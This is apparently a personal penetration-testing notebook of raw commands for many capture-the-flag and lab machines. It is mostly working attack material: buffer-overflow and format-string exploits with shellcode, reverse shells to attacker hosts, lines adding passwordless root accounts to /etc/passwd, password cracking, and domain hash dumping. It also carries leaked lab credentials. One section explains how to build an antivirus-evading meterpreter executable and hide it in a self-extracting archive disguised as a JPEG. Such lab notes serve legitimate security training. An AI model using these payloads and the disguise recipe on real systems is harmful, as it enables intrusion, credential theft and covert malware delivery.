http://10.10.10.115:9200/_search?q=clave
echo dXNlcjogc2VjdXJpdHkg | base64 -d
echo cGFzczogc3BhbmlzaC5pcy5rZXk= | base64 -d
ssh security@10.10.10.115
shell.js 
		##LFI kibana 6.4 souce:https://www.cyberark.com/threat-research-blog/execute-this-i-know-you-have-it/
ss -lnt
ssh -L 9000:localhost:5601 security@10.10.10.115
ssh -R 9000:localhost:5601 root@10.10.14.43 ##another tunnel
shell.js 
		##reverse shell in js
curl -O 10.10.14.43:3434/shell.js
nc -lvp 3434
http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../tmp/shell
http://127.0.0.1:9000/api/console/api_server?sense_version=%40%40SENSE_VERSION&apis=../../../../../../../../../../dev/shm/shell.js
whereis logstash
cat output.conf
echo “Ejecutar comando : bash -i >& /dev/tcp/10.10.16.161/6666 0>&1” > /opt/kibana/logstash_test
echo “Ejecutar comando : /tmp/nc -e /bin/bash 10.10.14.31 2222” > /opt/kibana/logstash_test
cat /dev/shm/root.sh             
#!/bin/bash
echo 'rooot::0:0:root:/root:/bin/bash' >> /etc/passwd
echo 'Ejecutar comando : sh /dev/shm/root.sh' > /opt/kibana/logstash_pwned
su rooot



Natas
============================================
hexeditor jpg.jpg
FF D8 FF E0
echo exec()
echo system()
passthru()
diff file1 file2


Pinkys Palace V1
===========================================
export {http,https,ftp}_proxy=10.0.2.35:31337
		##change double proxy Burp Project Options -> upstream proxy server
		##dst=*, proxyhost=10.0.2.35, proxy port=31337
gdb ./adminhelper
(gdb) info funtions
msf-pattern_create -l 200
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Aa0Ab1Ab2Ab3
		##copy value in "saved rip ="
msf-pattern_offset -q 0x63413563
python -c "A"*72+"BBBBBB"
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBB
(gdb) disassemble spawn
(gdb) r $(python -c "print 'A'*72+'\xd0\x47\x55\x55\x55\x55'")
python -c "print 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xd0\x47\x55\x55\x55\x55'" > output
./adminhelper `cat output`
python -c 'print "A"*268+"BBBB"+"CCCCCCCCCCCCC"'



TMUX
==================================
prefix=ctrl+a
ctrl + r = recursive search
prefix + c = new windows
tmux attach-session -t name
prefix + { = find
	+ ? = search words
	ctrl + space = block
	alt + w = copy to buffer
prefix + [ = edit mode
prefix + ] = paste buffer
prefix + % = half screen beside
prefix + " = half screen under
prefix + z = zoom screen in and out
prefix + } or <space> = change looks
prefix + s or ls = display session
prefix + x = kill unresponsif window




Protostart Format
============================================
./format0 $(python -c "print 'A'*64+'\xef\xbe\xad\xde'")
objdump -t format1 | grep target
for i in {1..200};do echo "trying offset $i - `./format1 DDDD%$i##$08x`"; done | grep DDDD44444444
./format1 $(python -c "print 'AAAA'+'%x.'+'%x'")
./format1 $(python -c "print 'AAAA'+'%x.'*128+'%x'")					##got 414141 value
./format1 $(python -c "print '\x38\x96\x04\x08' + '%x.'*128 + '%n'")	##replacc]e A
python -c "print 'AAAA'+'%x.'*3+'%x'" | ./format2
for i in {1..200};do echo DDDD%$i\$08x > /tmp/temp; echo "trying offset $i - `./format2 < temp`"; done | grep DDDD44444444
python -c "print '\xe4\x96\x04\x08'+'%4\$n'" | ./format2
python -c "print '\xe4\x96\x04\x08'+'A'*60+'%4\$n'" | ./format2
	##target format3 == 0x01025544
(echo -e $(python -c 'print "%08x"')) | ./format3
(echo -e $(python -c 'print "AAAA"+"%08x."*100')) | ./format3
(echo -e $(python -c 'print "AAAA"+"%12$08x."')) | ./format3
let x=0x01025544; echo $x;
(echo -e $(python -c 'print "\xf4\x96\x04\x08"+"%16930112u"+"%12$08n"')) | ./format3
echo -e (python -c "print '\x24\x97\x04\x08JUNK\x25\x97\x04\x08JUNK\x26\x97\x04\x08JUNK\x27\x97\x04\x08'+'%x%x%141x%n%208x%n%128x%n%260x%n'") | ./format4




Protostar Stack 5
============================================
gdb -q stack5
set dissasebly-flavor intel
disas main
(gdb) b* 0x080483da (ret value)
(gdb) r
ABCDEF
(gdb) i r
(gdb) x/s $esp				//(eax value/first value) should be ABCDEF
(gdb) p/d 0xbffff77c - 0xbffff730	//$esp - $eax will be offset value
msf-pattern_create -l 100
msf-pattern_offset -q 0x63413563	##offset value msf
(gdb)r
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
(gdb)x/s 0xbffff77c					##should be "BBBB"
python -c 'print "A"*76+"B"*4+"C"*100'
(gdb) r								##input python ABC
(gdb)x/60s $eax						##return address must be 0xbffff77c+4
									##got 0xbffff780 (0xbffff77c+4) (CCCC... value)
	##the exploit spawn shell
import struct
 
def m32(dir):
    return struct.pack("I",dir)
 
padding="A"*76
ret=m32(0xbffff780)
nops="\x90"*20
shellcode = ""
shellcode += "\x31\xc0\x50\x68\x2f\x2f\x73"
shellcode += "\x68\x68\x2f\x62\x69\x6e\x89"
shellcode += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
shellcode += "\xcd\x80\x31\xc0\x40\xcd\x80"
 
print padding+ret+nops+shellcode									
								
msfvenom -p linux/x86/exec CMD=/bin/sh -f py	##create shellcode w msfvenom
(python /tmp/exp ;cat) | ./stack5
		##padding+ret_dir+nops+shellcode



Protostar Stack 6
============================================
		##exploit function gets() and no binary Execution
strings -a -t x /lib/libc-2.11.2.so | grep "/bin/sh"
(gdb) set disassembly-flavor intel
(gdb) r
ctrl+c
(gdb) info proc map				##print address location environtment
(gdb) x/s 0xb7e5700 + 0x11f3bf	##address "/bin/sh" (stack6 in libc + string /bin/sh from libc
(gdb) p system					##address system
(gdb) p exit					##address exit
		##exploit ret2libc = padding+system addr +(return/exit/4hexdump)+shell addr
import struct
padding="A"*80
system= struct.pack("I", 0xb7ecff80)
return= "AAAA"
shell=struct.pack("I", 0xb7fb63bf)
print padding+system+return+shell




Protostar Stack 7
============================================
		##exploit return strdup(buffer)
objdump -M intel -d stack7 | grep “call.*eax”
Payload = shellcode + (NOP-(len(shellcode))+eax_addr
echo `python -c 'print("\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68##sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80" + "\x90"*25 + "\xbf\x84\x04\x08")'` | /opt/protostar/bin/stack7


Buffer overflow
============================================
(gdb) disas main
(gdb) break main
objdump -d apps
(gdb) set disassembly-flavor intel
-perm -4000 | grep apps
(gdb) p system
(gdb) p exit
eax = return exec
strcpy() instead of strncpy()
		##EIP = instruction pointer
		##ESP = stack pointer (point to lower memory/top of the stack
		##EBP = base pointer (point to higher memory/bottom of the stack)
$ESP - 300(nopsled)
gcc code1.c -o code1 -save-temps
printenv
ret - $rsp
functions:
gets() ##input after execution
scanf() ##input after eecution
strcpy() ##input argument
sprintf()
strcat()
memcpy()




Silky-CTF
================================================
crunch 7 7 charset.lst mixalpha-numeric-all-space -o asd -t s1lKy@@
cat asd | sort -r > dsa
hydra -l silky -P dsa 10.0.2.37 -t 4 -V ssh
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
scp silky@10.0.2.37:/usr/bin/sky .
string /usr/bin/sky
nano /tmp/whoami
#!/bin/bash
echo 'rooot::0:0:root:/root:/bin/bash' >> /etc/passwd
export PATH=/tmp
./sky



BrainPan 1
===============================================
nmap -sC -sV -A -p- 192.168.56.104
dirb http://192.168.56.104:10000
wget http://192.168.56.104:10000/bin/brainpan.exe
file brainpan.exe
wine brainpan.exe
		##download brainpan.exe open with immunity debugger
msf-pattern-create -l 600
msf-pattern_offset -q 0x76576123
		##find JMP ESP in immunity debugger with right click>search for>command>JMP ESP
objdump -M intel -d brainpan.exe | grep "jmp.*esp"
msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.56.105 LPORT=1234 -f -c -a x86 --platform linux -b "\x00" -e x86/shikata_ga_nai
pat=A*524
ret= value JMP ESP
nops \x90*10
s.send(pat+ret+nops+shellcode)
		##create handler in metasploit
msfconsole
use exploit/multi/handler
jobs
show payloads
set payload linux/x86/shell/reverse_tcp
set LHOST 192.168.56.105
set LPORT 1234
run
nc -lvp 1234
bash -i
bash -i >& /dev/tcp/192.168.56.105/4321 0>&1
cp /usr/local/bin/validate /home/puck/web/bin
wget http://192.168.56.104:10000/bin/validate
gdb -q validate
msf-pattern-create -l 200
msf-pattern_offset -q 0x9712uqw
objdump -M intel -d validate | grep "call.*eax"
shellcode(28)+nops(116-28)+calleax		##shellcode: http://shell-storm.org/shellcode/files/shellcode-811.php
validate `python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" + ("\x41" * 88) + "\xaf\x84\x04\x08"'`
sudo -l
mv anansi_util anansi_util.bck
cp /bin/bash ./anansi_util
sudo -S anansi_util
which ssl
ssl passwd godmode
echo 'rooot:w0cHJ.a5mvNYKk:0:0:root:/root:/bin/bash' >> /etc/passwd






Smash The Tux
=======================================
0x00 strcpy()--------------------------
uname --m
hostnamectl
lsb-release -a
uname --m > cname && hostnamectl >> cname && lsb-release -a >> cname
scp -r /home/user/peda tux@192.168.2.125:/home/tux
(gdb) checksec
msfvenom -p linux/x86/exec CMD=/bin/bash -f python -b \x00'
objdump -M intel -d pwdnme | grep "call.*eax"
print shell+nops(268-len(shell))+eax

0x01 printf()-------------------------
for i in {1..200};do echo "trying offset $i - `echo "DDDD%$i##$08x" | ./pwnme`"; done | grep DDDD44444444

0x02 if(stat)-----------------------------
		##race conditions
		##https://www.win.tue.nl/~aeb/linux/hh/hh-9.html
#!/bin/sh
touch myfile
while true; do
  ln -sf ./myfile a &
  ./pwnme a &
  ln -sf .readthis a &
done
./explout.sh

0x03 strcpy()----------------------------
gdb -q ./pwnme core

0x04 fopen()-----------------------------
ln -s /bin/sh r
PATH=.:$PATH ./pwnme payload

0x05 system()----------------------------
echo 'sh' > ls && chmod +x ls
PATH=.:$PATH ./pwnme

0x06 sprintf()&puts()--------------------
run `python -c 'print "%76xAAAA"'`
p system
run `python -c 'print "%76x\xe0\x43\xe6\xb7"'`
p exit
##find /bin/bash
##rettolibc
%76x+system+exit+/bin/bash

0x07 malloc()&strcpy()-------------------
payload = "sh;#" # The command we want to execute
payload += "A" * 16 # Padding to reach the pointer for the second instances name property
payload += "\x88\x97\x04\x08" # The address for the GOT entry of the strcpy function
payload += " " # End of argument the first
payload += "\xe0\x43\xe6\xb7" # Address of __libc_system - overwriting the GOT entry of the strcpy function
payload += "\x26\x83\x04\x08" # Original address of GOT entry of the malloc function
payload += "\x36\x83\x04\x08" # Original address of the GOT entry of the __gmon_start__ function
payload += "\xb9\x84\x04\x08" # Address of main+94 - overwriting the GOT entry of the exit function





Stack Overflows for Beginners: 1.0.1
=======================================
./levelOne `python -c 'print "A"*100'`
ldd levelTwo | grep libc
sysctl kernel.randomize_va_space
gdb -q ./levelTwo
(gdb) checksec
(gdb) vmmap
(gdb) r `python -c 'print "A"*36+"BBBB"'`
(gdb) p system
(gdb) searchmem /bin/sh
(gdb) searchmem exit
-----------level2--------------
./levelTwo `python -c 'print "A"*36+"\x80\xc9\xe0\xf7"+"BBBB"+"\x08\x70\x55\x56"'`
gdb -q ./levelTwo
(gdb) info functions
(gdb) pd spawn
##find execve@plt execute something maybe shell
./leveltwo `python -c 'print "A"*36+"\xc9\x61\x55\x56"'`
----------level3--------------
gdb -q ./levelThree
(gdb) vmmap
(gdb) r `python -c 'print "A"*268+"BBBB"'`
(gdb) p system
(gdb) searchmem /bin/sh
(gdb) searchmem exit
./levelThree `python -c 'print "A"*268+"\x80\xc9\xe0\xf7"+"BBBB"+"\xaa\xca\xf4\xf7"'`
gdb -q ./levelThree
(gdb) info proc map
objdump -M intel -D /usr/lib32/libc-2.28.so | grep "jmp.*esp"
(gdb) x/s 0xf7dc9000 + 6ff7
-----------level5-------------
pip install pwntools





Sick OS 1.2
==================================================
dirb http://10.1.1.8
nmap --script http-methods --script-args http-methods.url-path='/website' <target>
curl -X OPTIONS http://10.1.1.8/test -v
curl http://10.1.1.8/test --upload-file p0wny.php --http1.0
curl -T p0wny.php http://10.1.1.8/test/ --http1.0
mknod /tmp/pipe1 p
/bin/sh 0</tmp/pipe1 | nc 10.1.1.5 443 1>/tmp/pipe1
nc -lvp 443
curl -T LinEnum.sh http://10.1.1.8/test/ --http1.0
./LinEnum.sh >> linenum.txt
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.1.1.5 LPORT=443 -f raw > msfshell.php
msfconsole
> use exploit/multi/handler
> show payloads
> set payload php/meterpreter/reverse_tcp
> set LHOST 10.1.1.5
> set LPORT 443
> exploit -j
> sysinfo
> upload /root/Desktop/webshells/linexploit.sh
> shell
python -c 'import pty;pty.spawn("/bin/bash")'
		##got cron chkrootkit
chkrootkit -V
searchsploit chkrootkit
echo "#!/bin/bash" > /tmp/update
echo 'echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash" >> /etc/passwd' >> /tmp/update
chown root:root /bin/sh ; chmod 4777 /bin/sh 		##setuid /bin/sh
su rooot											##pass pass123
/bin/sh



MyHouse 7
==================================
ifconfig enp0s3 up
dhclient -v enp0s3
/bin/bash -c 'bash -i >& /dev/tcp/10.1.1.5/4321 0>&1'
grep -ri "tryharder" /* 2>/dev/null
gzip -d mysql.tar.gz
tar -xvf mysql.tar
hydra -L user.txt -e nsr 10.1.1.9 ssh
scp  mysql.tar.xz admin@10.1.1.9:/tmp
./mysql -h 10.1.1.9 -u root -p
select load_file ("/etc/passwd");
ifconfig | grep inet
./nmap -sT 172.31.30.0/24
ssh -L 444:172.31.30.24:445 admin@10.1.1.9
ssh -L 139:172.31.30.24:139 admin@10.1.1.9
netstat -tauntp
enum4linux 127.0.0.1 | tee enum
smbmap -H 127.0.0.1 -P 444 -u heather -p heather
smbclient \\127.0.0.1\users -U heather -p 444
>dir
>get flag.txt
smbclient \\127.0.0.1/users -U heather -p 444
>get Flag.txt
		##how to conneect smb with file explore
other location > connect to server > smb://127.0.0.1:444/users > input user passwd
7z e moreinfo.7z
for i in $(seq 0 9); do echo {{tryharder:0$i}}; done >> wordlist
for i in $(seq 10 99); do echo $i && 7z e -p{{tryharder:$i}} moreinfo.7z; done >> wordlist
ssh -L 22222:172.31.20.194:24 admin@10.1.1.9
hydra -L user.txt -P pass.txt -s 22222 -e nsr 127.0.0.1 ssh
ssh -p 22222 root@127.0.0.1
grep -ri "tryharder" /* 2>/dev/null




Kioptrix 4
=====================================
Enum4Linux -a 10.1.1.10 | tee enumlinux
nmap --script smb-enum-users -iL 10.1.1.10 -oN nmapsmb
nmap --script smb-vuln* -p 445 10.1.1.10
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
find / -perm -4777 -type f 2>/dev/null | xargs ls -laht
find / -perm -777 -type f 2>/dev/null | xargs ls -laht
locate udf
select * from mysql.func;
select sys_exec('usermod -a -G admin john');
select sys_exec('echo "rooot::0:0:root:/root:/bin/bash');
openssl passwd -1 -salt ignite pass123
mkpasswd -m SHA-512 pass
python -c 'import crypt; print crypt.crypt("pass", "$6$salt")'
perl -le 'print crypt("pass123", "abc")'
php -r "print(crypt('aarti','123') . \"\n\");"
ruby -r 'digest' -e 'puts "pass".crypt("$6$salt")'


HackInOS 0.1
===================================
wpcan --url http://localhost:8000 --enumerate u
dirb http://localhost:8000
for i in $(seq 0 101); do echo -n "php-reverse-shell.php$i" | md5sum | cut -d " " -f1; done | tee file
wfuzz -c -w file --hc 404 http://localhost:8000/uploads/FUZZ.php
nc -lvp 3434
python -c 'import pty;pty.spawn("/bin/bash")'
^Z
stty raw -echo
fg
reset
find / -perm -4000 -type f 2>/dev/null | xargs ls -laht
tail -n 100 /etc/passwd > passwd.txt
tail -n 100 /etc/shadow > shadow.txt
unshadow passwd.txt shadow.txt > unshadow.txt
john unshadow.txt
su root




Metasploitable 3 windows
====================================
		##jerkins
tcpdump -ni eth0 icmp
nmap --script vulscan -sV -p 8022 10.1.1.12
nmap --script vulscan --script-args vulscandb=exploitdb.csv -sV -p 8022 10.1.1.12
		##manageengine desktop central 9
searchsploit manage engine desktop 9
>use exploit/windows/http/manageengine_connectionid_write
>set lhost 10.1.1.5
>set rhost 10.1.1.12
>exploit
>sysinfo
>shell
		##wampserver
curl -T p0wny.php http://10.1.1.12:8585/uploads/
		##elasticsearch
http://10.1.1.12:9200/metasploitable3/_search?pretty
curl -X GET http://10.1.1.12:9200/metasploitable3_search" -H 'Content-Type: application/json' -d
PUT http://10.1.1.12:9200/index/_doc/id
{
	"name" : "asd",
	"email" : "asd@asd",
	"address" : {
		"coutry" : "indog"
		"city" : "madman"
		},
	"hobby" : ["eat","shit"]},
}
http://10.1.1.12:9200/index/_doc/id
curl -X DELETE http://10.1.1.12:9200/index/_doc/id
curl -X POST http://10.1.1.12:9200/index/_update/id
{
	"name" : "asd",
}
http://10.1.1.12:9200/_cat/indices?v
http://10.1.1.12:9200/_search/
curl -X GET http://10.1.1.12:9200/index/_search
{
	"query" : {
		"match" : {
			"address.city" : "madman"
		}
	}
}
elasticdump



Forest HTB
===================================
git clone https://github.com/sensepost/UserEnum
./UserEnum_RPC.py 10.10.10.161 userlist.txt
rpcclinet -U"%" 10.10.10.161
rpcclient -U"" -N 10.10.10.161
rpcclinet?> ?
>enumdomusers
>enumdomgroups
	#save user to user.txt
enum4linux -a 10.10.10.161
	#emumerate user without rpcclient
GetNPUsers.py -dc-ip 10.10.10.161 htb
	#find hash without preauth
GetNPUsers.py -usersfile ../forest/userasli.txt -no-pass -dc-ip 10.10.10.161 htb/
hashcat -m 18200 -a 0 -w 3 forest.hash /usr/share/wordlists/rockyou.txt --force
gem install evil-winrm
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
upload SharpHound.ps1 c:\temp\SharpHound.ps1
>Import-module ./SharpHound.ps1
>Invoke-BloodHound -CollectionMethod All
>Invoke-Bloodhound -CollectionMethod All -Domain htb.local -LDAPUser "svc-alfresco" -LDAPPass "s3rvice"
	#svc-alfresco is part of "account operators group windows" group which can create user
	#https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups
	#abuse group of "account operator" create user
PS>New-ADUser -Name hacker -SamAccountName tai -AccountPassword (ConvertTo-SecureString "tai123!" -AsPlainText -Force) -Enabled $True
>net user tai tai123! /add
	#add to "Exchange Windows Permissions" groups
PS>Add-ADGroupMember -Identity "Exchange Windows Permissions" -Members tai
>net group "Exchange Windows Permissions" /add tai
	#group properties
PS>Get-ADUser -Identity hacker -Properties *
>net group "Exchange Windows Permissions"
	#add user to DCSync
copy \\10.10.14.2\asd\PowerView.ps1
. .\PowerView.ps1
$SecPassword = ConvertTo-SecureString "taitai1" -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential("htb.local\tai", $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity tai -Rights DCSync
Start-Process -FilePath "powershell.exe" -ArgumentList "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/rev.ps1')" -Credential $mycreds
Start-Process -FilePath "C:\temp\rshell.exe" -Credential $Cred
	#another way to add user to DCSycn
aclpwn -f tai -t htb.local -d htb.local -s 10.10.10.161 -u tai -p taitai1
	#dump hash
impacket/secretsdump.py -just-dc-ntlm HTB/tai:taitai1@10.10.10.161
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 administrator@10.10.10.161
type Users\Administrator\Desktop\root.txt
crackmapexec smb 10.10.10.161 -u Administrator -d htb.local -H 32693b11e6aa90eb43d32c72a07ceea6
crackmapexec winrm 10.10.10.161 -u Administrator -d htb.local -H 32693b11e6aa90eb43d32c72a07ceea6
>whoami
	htb\administrator
	#ps-esec for high integrity shell
impacket-psexec -hashes :32693b11e6aa90eb43d32c72a07ceea6 htb.local/Administrator@10.10.10.161
>whoami
	nt authority\system



RE HTB
===================================
smbmap -H 10.10.10.144 -u 'anonymous' -p ''
smbclient \\reblog.htb\malware_dropbox
>put nmap
>dir
		##create malicious ODS file
msfconsole
use exploit/multi/misc/openoffice_document_macro
show options
set srvhost 10.10.15.59
set srvport 4343
exploit
cp /root/.msf4/local/msf.odt .msf.ods
cp msf.ods msf.ods.zip
unzip msf.ods.zip -d files/
		##create virus
msfconsole
use payload/windows/x64/meterpreter/reverse_tcp
generate -f exe -i 3 -o virus.exe -p windows
zip -r malicious.ods.zip ./*




Player HTB
=====================================
searchsploit openssh 6.6
searchsploit -m 41136
wfuzz -c -f sub-fighter -w /wordlist/seclist/Deiscovery/DNS/subdomains-top1mil-5000.txt -u "http://chaos.htb" -H "Host: FUZZ.chaos.htb" -t 42 --hl 1
wfuzz -c -w /opt/SecLists/Discovery/DNS/subdomains.txt --hc 400,403,404 -H "Host: FUZZ.player.htb" -u http://player.htb -t 50
	##list avaliable site addresses
	dev.player.htb
	chat.player.htb
	staging.player.htb
	player.htb/launcher/
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php~
	##got source code how to encrypt
	'access_code' => 'C0B137FE2D792459F26FF763CCE44574A5B5AB03' ]; 
	$key = '_S0_R@nd0m_P@ss_'; 
	$jwt = JWT
		##jwt.io how to decrypt JWT js, and access again with cookies access="jwt"
http://player.htb/launcher/dee8dc8a47256c64630d803a4c40786c.php
http://player.htb/launcher/7F2dcsSdZo6nj3SNMTQ1/
		##upload file and download it and play it
file 1438328879.avi
		##https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
python gen_avi_bypass.py file:///etc/passwd passwdavi
python gen_avi_bypass.py file:///var/www/backup/service_config srvconfgavi
		##got credentials telegen:d-bC|jC!2uepS/w
python gen_avi_bypass.py file:///etc/apache2/sites-enabled/000-default.conf apachecnfavi
ssh -o IdentitiesOnly=yes -l telegen 10.10.10.145 -p 6686
searchsploit ssh 7.2
searchsploit -m 39569
python 39569.py
python 39569.py player.htb 6686 telegen 'd-bC|jC!2uepS/w'
.readfile /var/www/staging/fix.php
		##got credentials peter:CQXpm\z)G5D#%S$y=
dev.player.htb
		##login and create project under /var/www/demo/ athen upload p0wny.php and access it
dev.player.htb/languages/sr.php
mknod /tmp/pipe1 p
/bin/sh 0</tmp/pipe1 | nc 10.10.14.203 4343 1>/tmp/pipe1
nc -lvp 4343
wget http://10.10.14.203:8888/pspy64
chmod +x pspy64
./pspy64
cp /var/lib/playbuf/buff.php /var/www/html/demo/languages/buff.txt
wget dev.player.htb/languages/buff.txt
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak
		##cant download reverse shell because firewall
cat phpsh.php | base64 -w 0
echo '' >> /tmp/phpsh.b64
base64 -d /tmp/phpsh.b64 > /tmp/phpsh.php
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak
cp /tmp/phpsh.php /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php
nc -lvp 4334
cp /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php.bak /var/www/html/launcher/dee8dc8a47256c64630d803a4c40786g.php






Postman HTB
======================================
curl -ks
ssh-keygen -t rsa -f /root/.ssh/redis_ssh_key -q -N ""
(echo -n "\"\n\n"; cat /root/.ssh/redis_ssh_key.pub; echo -n "\n\n\"")
		##redis RCE https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html
telnet 10.10.10.160 6379
>set key "//paste key and \n"
>config set dir /var/lib/redis/.ssh
>config set dbfilename authorized_keys
>save
>quit
ssh -o IdentitiesOnly=yes -l redis -i /root/.ssh/redis_ssh_key 10.10.10.160
find / -name "*.bak" -print -execdir ls -la {} \; 2>/dev/null
cat /opt/id_rsa.bak
python /usr/share/john/ssh2john.py matt_private_key.txt > matt_private_key.hash
		##fix the format
nano matt_private_key.hash
john --wordlist=/usr/share/wordlists/rockyou.txt matt_private_key.hash
su Matt
ls -lah /var/www/
msfconsole
use exploit/linux/http/webmin_packagup_rce
>set rhost 10.10.10.160
>set lhost 10.10.12.120
>set ssl true
>set username Matt
>set password computer2008
>exploit
echo "rooot:`openssl passwd -1 -salt ignite pass123`:0:0:root:/root:/bin/bash
ssh rooot@10.10.10.160
		##change format passwd and shadow
		##reference shadow: https://www.cyberciti.biz/faq/understanding-etcshadow-file/
nano /etc/shadow
nano /etc/passwd


AI HTB
====================================
./query_ai.sh "open single quote space union select space username space from users comment database"
./query_ai.sh "open single quote space union select space password space from users comment database"
	user= alexa:H,Sq9t6}a<)?q93_
ssh alexa@10.10.10.163
netstat -tnlp
~C
-L 8080:localhost:8080
-L 8000:localhost:8000
-attach localhost:8000
python jdwp-shellifier.py -t 127.0.0.1 -p 8000 --cmd '/tmp/x.sh' --break-on "java.lang.String.indexOf" 




GitLab HTB
====================================
http://10.10.10.144/robots.txt
http://10.10.10.144/help/bookmarks.html
	##open gitlab login in source, there is javascript bookmark for login in hex
	##decode hex in python or here: http://ddecode.com/hexdecoder/
	##upload file than merge and get shell
	##open snippet and get database creds
sudo -l
cp -r /var/www/html/profile /tmp/.whops/
echo "#!/bin/bash" > .git/hooks/post-merge
echo 'echo "rooot:`openssl passwd -1 -salt ignite godmode`:0:0:root:/root:/bin/bash" >> /etc/passwd' >> .git/hooks/post-merge
	##merge something on profile to get pull
	##reference post-merge: https://www.liquidlight.co.uk/blog/using-a-post-merge-git-hook-to-clean-up-old-branches/
sudo git pull
cat /etc/passwd
su rooot
	##normal chalenge
ip neigh
time for i in {1..254}; do (ping -c 1 172.19.0.$i | grep "bytes from" | cut -d':' -f1 | cut -d' ' -f4 &); done
nmap  172.19.0.2-5
php -a
> $connection = new PDO('pgsql:host=localhost;dbname=profiles', 'profiles', 'profiles');
> $result = $connection->query("SELECT * FROM profiles");
> $profiles = $result->fetchAll();
> print_r($profiles);
	##got creds
	clave
    c3NoLXN0cjBuZy1wQHNz==
ssh clave@10.10.10.144
scp clave@10.10.10.144:/home/clave/RemoteConnection.exe .
file RemoteConnection.exe
	##open with immunity debugger
search for > all reference text string > open location "Access Denied"
set location right before it > breakpoint > toggle > run
	##check stings on right bottom
	##got creds
	root
	Qf7]8YSV.wDNF*[7d?j&eD4^
ssh root@10.10.10.144


Create Windows payload Meterpreter
===================================
Install Windows Matasploitable 3 machine
install python from here
	https://www.python.org/ftp/python/2.7.16/python-2.7.16.msi
make sure when install python add to PATH
download py2exe
	https://sourceforge.net/projects/py2exe/files/py2exe/0.6.9/py2exe-0.6.9.win32-py2.7.exe/download
create windows python payload in kali:
	msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.2.10 LPORT=443 -f raw -o /var/www/html/mrtp.py
create setup.py in
	from distutils.core import setup
	import py2exe
	setup(
	name = ‘Meter’,
	description = ‘Python-based App’,
	version = ‘1.0’,
	windows=[‘mrtp.py’],
	options = {‘py2exe’: {‘bundle_files’: 1,’packages’:’ctypes’,’includes’: ‘base64,sys,socket,struct,time,code,platform,getpass,shutil’,}},
	zipfile = None,
	)
Budle it in windows metasploitable machine:
	python.exe .\setup.py py2exe
	.\dist\mrtp.exe
Set listener
    msfconsole
    use exploit/multi/handler
    set PAYLOAD python/meterpreter/reverse_tcp
    set LHOST 172.28.128.5
    set LPORT 443
    run
Create custom payload below
	import socket,struct,time
	print ("Running . . .")
	for x in range(10):
        try:
                s=socket.socket(2,socket.SOCK_STREAM)
                s.connect(('172.28.128.5',443))
                break
        except:
                time.sleep(5)
	l=struct.unpack('>I',s.recv(4))[0]
	d=s.recv(l)
	while len(d)<l:
        d+=s.recv(l-len(d))
	exec(d,{'s':s})
	print ("Pengganti payloadku")
	print ("Ramashok!")
encode with base64
customize mrtp.py with new payload
	import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('base64payload==')))
Budle it in windows metasploitable machine:
	python.exe .\setup.py py2exe
	.\dist\mrtp.exe
Hide file exe in sfx image
add to archive
method best
create SFX archive
advance - SFX options
general
	path to extract: %APPDATA%
	absolute path
setup
	run after extraction:
	apps.exe
	image.jpg
modes
	hideall
update 
	extract and replace file
	overwrite all files
	text and incon create image icn
OK
change name to something.jpg
create listener
open file, session run in background
resource:
https://medium.com/bugbountywriteup/antivirus-evasion-with-python-49185295caf1
https://stackoverflow.com/questions/41129537/hide-the-console-of-an-exe-file-created-with-pyinstaller/41129758
https://msfn.org/board/topic/146499-winrar-sfx-code-to-copy-files-to-userprofileapplication/



Symfonos 5
====================================
nmap -sC -sV -A -p- 10.1.1.127 -o nmapfull
dirb http://10.1.1.27 -X .php,.html
	home.php
	admin.php
	logout.php
10.1.1.27/home.php
10.1.1.27/home.php?url=http://127.0.0.1/potraits.php
10.1.1.27/home.php?url=/etc/passwd
10.1.1.27/home.php?url=admin.php'
	##got credentials
	$bind = ldap_bind($ldap_ch, "cn=admin,dc=symfonos,dc=local", "qMDdyZh3cT6eeAWD")
nmap 10.1.1.27 -p 389 --script ldap-search --script-args 'ldap.username="cn=admin,dc=symfonos,dc=local", ldap.password="qMDdyZh3cT6eeAWD"'
